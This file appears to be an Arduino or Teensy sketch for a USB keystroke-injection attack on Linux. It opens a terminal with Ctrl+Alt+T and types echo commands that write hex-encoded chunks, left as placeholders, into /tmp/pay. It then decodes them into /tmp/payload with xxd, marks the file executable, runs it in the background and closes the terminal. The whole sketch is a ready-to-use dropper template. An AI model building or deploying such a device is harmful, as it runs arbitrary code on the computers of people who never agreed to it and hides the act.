

void setup()
{
  delay(5000);
  terminal();
  delay(3000);
  Keyboard.println("echo INPUT0 > /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT1 >> /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT2 >> /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT3 >> /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT4 >> /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT5 >> /tmp/pay");
  delay(100);
  Keyboard.println("echo INPUT6 >> /tmp/pay");
  delay(2000);
  Keyboard.println("xxd -r -p /tmp/pay /tmp/payload");
  delay(2000);
  Keyboard.println("chmod +x /tmp/payload");
  Keyboard.println("/tmp/payload &");
  delay(2000);
  Keyboard.println("exit");
  
}

void loop()
{
   
}

void terminal()
{
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  delay(100);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now(); 

}
